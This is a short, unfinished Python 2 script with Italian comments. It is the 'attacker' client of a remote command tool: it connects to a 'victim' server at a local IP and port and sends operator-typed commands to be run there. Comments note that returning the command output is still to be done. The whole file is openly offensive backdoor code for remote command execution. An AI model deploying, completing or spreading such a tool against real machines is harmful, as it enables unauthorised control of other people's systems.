import socket
import sys
from thread import *
import time
import SocketServer
import os
import subprocess
import shlex

###### CLIENT (ATTACCANTE) DA CONNETTERE AL SERVER (VITTIMA) ######

chost = '192.168.1.119'
cport = 8888

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((chost, cport))
    print("Connessione stabilita")
except socket.error as msg:
    print("Impossibile connettersi, codice errore: " + str(msg[0]) + "stringa errore: " + str(msg[1]))
    sys.exit()
while 1:
    comando = raw_input("Inserisci comando: ")
    if comando == "exit": break
    s.sendall(comando)
    data = s.recv(1024)
s.close()
###### IL SERVER RICEVE CORRETTAMENTE IL COMANDO DAL CLIENT ######
###### DOBBIAMO FARE IN MODO CHE IL SERVER MANDI LA RISPOSTA AL CLIENT ######
